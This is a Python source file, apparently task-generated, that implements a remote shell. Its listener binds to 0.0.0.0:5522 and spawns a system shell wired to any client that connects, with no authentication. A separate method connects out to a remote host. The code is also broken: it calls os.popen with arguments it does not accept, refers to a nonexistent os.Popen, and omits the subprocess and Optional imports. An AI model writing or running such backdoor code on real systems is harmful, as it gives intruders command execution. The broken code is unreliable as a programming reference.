from TASK_001_models import ExecutionResult, ReverseShellConfig
import os
import select
import socket


class UnixReverseShell:
    """Manages a single reverse shell session with subprocess and socket communication."""

    def __init__(self, config: ReverseShellConfig):
        self.config = config
        self.client_socket: Optional[socket.socket] = None
        self.child_process: Optional[os.Popen] = None
        self.stdin_pipe: Optional[socket.socket] = None
        self.stdout_pipe: Optional[socket.socket] = None
        self.stderr_pipe: Optional[socket.socket] = None

    def connect(self, host: str, port: int) -> ExecutionResult:
        """Establish connection to the remote shell server."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5.0)
            sock.connect((host, port))
            self.client_socket = sock
            return ExecutionResult(command_output=f"Connected to {host}:{port}", exit_code=0)
        except Exception as e:
            return ExecutionResult(command_output="", exit_code=1, error_messages=[str(e)])

    def spawn_shell(self) -> ExecutionResult:
        """Spawn a shell subprocess and set up socket pipes."""
        try:
            self.child_process = os.popen(
                self.config.shell_type,
                stdin=self.client_socket.makefile('r'),
                stdout=self.client_socket.makefile('w'),
                stderr=subprocess.STDOUT,
            )
            return ExecutionResult(command_output=f"Shell spawned: {self.config.shell_type}", exit_code=0)
        except Exception as e:
            return ExecutionResult(command_output="", exit_code=1, error_messages=[str(e)])

    def run(self) -> ExecutionResult:
        """Main loop: read commands from client, execute via subprocess, write output back."""
        try:
            self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.client_socket.bind(('0.0.0.0', self.config.port))
            self.client_socket.listen(5)
            self.client_socket.settimeout(self.config.timeout)

            while True:
                try:
                    ready, _, _ = select.select([self.client_socket], [], [], 1.0)
                    if ready:
                        client_sock, addr = self.client_socket.accept()
                        print(f"[+] Connection from {addr}")
                        self.client_socket = client_sock

                        stdin_pipe = client_sock.makefile('r')
                        stdout_pipe = client_sock.makefile('w')

                        self.child_process = os.popen(
                            self.config.shell_type,
                            stdin=stdin_pipe,
                            stdout=stdout_pipe,
                            stderr=subprocess.STDOUT,
                        )

                        result = ExecutionResult(command_output=f"Shell spawned: {self.config.shell_type}", exit_code=0)
                        return result

                except socket.timeout:
                    continue
                except Exception as e:
                    return ExecutionResult(command_output="", exit_code=1, error_messages=[str(e)])

        finally:
            if self.child_process and self.child_process.poll() is None:
                self.child_process.terminate()
            if self.client_socket:
                try:
                    self.client_socket.close()
                except Exception:
                    pass


class UnixReverseShellListener:
    """Main listener that spawns a subprocess to execute remote commands via socket communication."""

    def __init__(self, config: ReverseShellConfig):
        self.config = config
        self.server_socket: Optional[socket.socket] = None
        self.child_process: Optional[os.Popen] = None
        self.stdin_pipe: Optional[socket.socket] = None
        self.stdout_pipe: Optional[socket.socket] = None
        self.stderr_pipe: Optional[socket.socket] = None

    def start(self) -> ExecutionResult:
        """Start the reverse shell listener on 0.0.0.0:5522."""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind(('0.0.0.0', self.config.port))
            self.server_socket.listen(5)
            self.server_socket.settimeout(self.config.timeout)

            print(f"[+] Listening on 0.0.0.0:{self.config.port}")

            while True:
                try:
                    ready, _, _ = select.select([self.server_socket], [], [], self.config.timeout)
                    if ready:
                        client_sock, addr = self.server_socket.accept()
                        print(f"[+] Connection from {addr}")

                        stdin_pipe = client_sock.makefile('r')
                        stdout_pipe = client_sock.makefile('w')

                        self.child_process = os.popen(
                            self.config.shell_type,
                            stdin=stdin_pipe,
                            stdout=stdout_pipe,
                            stderr=subprocess.STDOUT,
                        )

                        result = ExecutionResult(command_output=f"Shell spawned: {self.config.shell_type}", exit_code=0)
                        return result

                except socket.timeout:
                    continue
                except Exception as e:
                    return ExecutionResult(command_output="", exit_code=1, error_messages=[str(e)])

        finally:
            if self.child_process and self.child_process.poll() is None:
                self.child_process.terminate()
            if self.server_socket:
                try:
                    self.server_socket.close()
                except Exception:
                    pass


if __name__ == "__main__":
    config = ReverseShellConfig(host='0.0.0.0', port=5522, timeout=30.0)
    listener = UnixReverseShellListener(config)
    result = listener.start()
    print(f"Result: {result.command_output} (exit_code={result.exit_code})")
